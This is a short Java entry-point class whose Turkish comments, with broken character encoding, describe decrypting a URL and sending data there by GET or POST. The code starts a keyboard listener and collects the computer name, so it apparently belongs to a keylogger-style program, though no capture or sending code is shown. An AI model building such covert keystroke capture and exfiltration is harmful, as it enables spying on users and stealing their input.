package main;

import ComputerNameSettings.ComputerNameSolver;
import keyboard.Keyboard;
import messages.MessageSender;

/*
 * 
 * karde� bu program buradan ba�lar ba�ta net k�sm�n� olu�turur net k�sm�nda get ve post 
 * senderi olu�turur oradan da olu�turulan senderdan url almak i�in decrypt eder sayfay� 
 * decrypt edilen url yi al�p ona get veya posta g�re at�m yapar
 * 
 * 
 */
public class Main {

	public static void main(String[] args) throws InterruptedException {
		// internetle olan ba�lant�lar� ayarlar
		ComputerNameSolver solver = new ComputerNameSolver();

		Keyboard key = new Keyboard();
		key.start();

		MessageSender sender = new MessageSender();

	}

}
